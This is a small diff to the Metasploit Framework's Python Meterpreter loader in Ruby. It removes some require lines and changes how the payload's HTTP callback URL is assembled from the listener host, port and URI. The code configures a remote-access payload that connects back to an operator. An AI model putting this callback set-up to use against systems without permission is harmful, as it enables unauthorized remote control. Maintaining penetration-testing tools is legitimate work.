@@ -1,9 +1,5 @@
 # -*- coding: binary -*-
 
-require 'msf/core'
-require 'msf/core/payload/transport_config'
-require 'msf/base/sessions/meterpreter_options'
-require 'msf/core/payload/uuid/options'
 
 module Msf
 
@@ -117,7 +113,7 @@ module Payload::Python::MeterpreterLoader
       uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
       opts[:scheme] ||= opts[:url].to_s.split(':')[0]
       scheme, lhost, lport = transport_uri_components(opts)
-      callback_url = "#{scheme}://#{lhost}:#{lport}#{ds['LURI']}#{uri}/"
+      callback_url = "#{scheme}://#{lhost}:#{lport}#{luri}#{uri}/"
 
       # patch in the various payload related configuration
       met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(callback_url)}'")
